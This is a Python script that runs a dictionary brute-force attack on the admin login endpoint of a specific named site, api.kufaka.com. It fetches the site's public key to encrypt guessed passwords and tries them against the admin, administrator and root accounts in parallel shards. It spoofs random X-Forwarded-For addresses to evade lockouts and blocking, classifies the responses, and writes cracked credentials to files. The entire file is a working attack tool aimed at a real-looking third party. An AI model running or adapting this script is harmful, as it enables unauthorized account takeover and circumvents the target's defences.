import sys, os, json, time, base64, random, re, subprocess, urllib.parse

TARGET = "api.kufaka.com"
BASE = "https://%s" % TARGET
WORDS_FILE = "_tmp_dict.txt"
USERS = ["admin", "administrator", "root"]

shard = int(sys.argv[1]); sc = int(sys.argv[2])
cap = int(sys.argv[3]) if len(sys.argv) > 3 else 240

def curl(method, path, headers=None, data=None, timeout=15):
    hdrs = {"Host": TARGET, "User-Agent": "Mozilla/5.0",
            "Referer": "https://api.kufaka.com/admin/"}
    hdrs.update(headers or {})
    cmd = ["curl", "-sS", "--http2", "-m", str(timeout), "-o", "-",
           "-w", "\n__HTTP__%{http_code}"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    if data is not None:
        cmd += ["-X", "POST", "--data-binary", data]
    cmd += [BASE + path]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 15).stdout
    except Exception as e:
        return 0, "ERR:%s" % type(e).__name__
    body, sep, code = out.rpartition("\n__HTTP__")
    return (int(code) if code.isdigit() else 0), body

def get_pubkey():
    for _ in range(16):
        st, t = curl("GET", "/admin/auth/getPublicKey",
                     {"X-Requested-With": "XMLHttpRequest", "Referer": "https://api.kufaka.com/"})
        pem = None
        try:
            pem = json.loads(t)["data"]["public_key"]
        except Exception:
            m = re.search(r"-----BEGIN PUBLIC KEY-----(.*?)-----END PUBLIC KEY-----", t, re.S)
            if m:
                pem = "-----BEGIN PUBLIC KEY-----" + m.group(1).replace("\\n", "\n") + "-----END PUBLIC KEY-----"
        if pem and "BEGIN PUBLIC KEY" in pem:
            return pem
        print("pubkey retry st=%s body=%r" % (st, t[:120]), flush=True)
        time.sleep(2)
    raise SystemExit("no pubkey")

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
pub = serialization.load_pem_public_key(get_pubkey().encode())
def enc(w): return base64.b64encode(pub.encrypt(w.encode(), padding.PKCS1v15())).decode()

def classify(st, t):
    if st == 0 or t.startswith("ERR:"): return "err"
    if st == 403 or "Forbidden" in t[:80] or "x-tengine-error" in t[:300].lower():
        return "block"
    if "多次登录失败" in t: return "lock"
    if "用户名或密码错误" in t: return "miss"
    if '"code":200' in t.replace(" ", ""): return "hit"
    return "other"

words = [l.strip() for l in open(WORDS_FILE, encoding="utf-8", errors="ignore") if l.strip()]
attempts = [(u, w) for w in words for u in USERS]
mine = attempts[shard::sc]
if cap and len(mine) > cap:
    mine = mine[:cap]
print("shard %d/%d attempts=%d cap=%d words=%d first=%r" % (shard, sc, len(mine), cap, len(words), mine[0] if mine else None), flush=True)

stats = {"tested": 0, "miss": 0, "lock": 0, "other": 0, "block": 0, "err": 0, "hit": 0}
hits = []; t0 = time.time()
for i, (u, w) in enumerate(mine):
    done = False
    for attempt in range(6):
        xff = "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255), random.randint(0, 255), random.randint(1, 254))
        body = urllib.parse.urlencode({"username": u, "password": enc(w), "totp": "", "enc": "1"})
        st, t = curl("POST", "/admin/auth/login",
                     {"X-Requested-With": "XMLHttpRequest", "X-Forwarded-For": xff}, body)
        v = classify(st, t)
        if v in ("lock", "block", "err", "other"):
            stats[v] = stats.get(v, 0) + 1
            if i < 3 and v in ("other", "err"):
                print("RTRY", v, "st=%s t=%r" % (st, t[:100]), flush=True)
            time.sleep(2.5 if v in ("lock", "block") else 0.5)
            continue
        stats["tested"] += 1; stats[v] = stats.get(v, 0) + 1
        if v == "hit":
            hits.append({"user": u, "pw": w, "resp": t[:300]})
            print("*** HIT", u, repr(w), t[:200], flush=True)
        done = True; break
    if i % 25 == 0:
        print("[%.0fs] %d/%d %s" % (time.time() - t0, i, len(mine), stats), flush=True)

print("DONE shard", shard, stats, "elapsed=%.0fs" % (time.time() - t0), flush=True)
json.dump(hits, open("hits_%d.json" % shard, "w"), ensure_ascii=False)
print("HITS_JSON", json.dumps(hits, ensure_ascii=False), flush=True)
